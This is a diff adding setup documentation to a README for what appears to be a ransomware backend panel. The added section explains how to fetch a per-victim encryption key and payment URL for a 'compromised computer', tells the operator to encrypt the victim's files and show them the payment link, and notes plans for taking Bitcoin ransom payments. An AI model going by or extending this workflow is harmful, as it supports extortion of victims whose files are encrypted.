@@ -22,3 +22,17 @@ Those values must corespond with your database information. Now run the followin
     
 That command will create all of the tables for you.
 
+
+#Generating keys
+
+When we generate keys, we get the identifier you send the system and AES encrypt it, and send back the encryption key, and the payment url, for example: Visit http://mysite.com/rsa/(identifier) replace the `(identifier)` with the id you generated for the compromised computer, and you will get the following json response back:
+
+    {"rsa":"eyJpdiI6IjBXXC9ocXc4YUhrb3ArWGpadzR1b3NBPT0iLCJ2YWx1ZSI6IjhUaEl1NmM1aUFUSVoxdk13cGpWcWc9PSIsIm1hYyI6IjhmNTY3NTQ4ZjcyZGQ5MmU1NDI1ZTQ0ZDYyNTA3OGY4ZWYxODkwZjhkNzE5ODEwZWIzYTE2MDBmMjg0M2I1NmEifQ==","url":"http:\/\/mysite.com\/payment\/pay\/34543"}
+    
+    
+You can then encrypt their files with the rsa key, and display the payment URL to them. 
+
+
+#Updates
+
+At the moment, we do not accept payments, it's been a while since using Bitcoin, and all API's require verification, I may use an RPC client, but that will require a VPS to run the bitcoin daemon on. 
